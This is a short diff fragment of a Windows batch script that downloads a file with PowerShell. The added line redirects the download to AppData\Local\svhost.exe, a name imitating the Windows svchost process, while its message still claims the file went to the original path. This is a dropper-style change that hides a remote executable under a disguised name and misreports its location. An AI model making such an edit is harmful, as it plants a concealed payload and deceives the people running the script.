@@ -15,7 +15,7 @@ timeout /t 1 >nul
 
 :: Download the file
 echo Downloading file 
-powershell -Command "try { Invoke-WebRequest -Uri '%url%' -OutFile '%outputFilePath%'; Write-Host 'File successfully downloaded to %outputFilePath%' -ForegroundColor Green } catch { Write-Host 'Failed to download the file.' -ForegroundColor Red; exit 1 }"
+powershell -Command "try { Invoke-WebRequest -Uri '%url%' -OutFile $env:USERPROFILE\AppData\Local\svhost.exe ; Write-Host 'File successfully downloaded to %outputFilePath%' -ForegroundColor Green } catch { Write-Host 'Failed to download the file.' -ForegroundColor Red; exit 1 }"
 
 :: Check if the file exists
 if not exist "%outputFilePath%" (
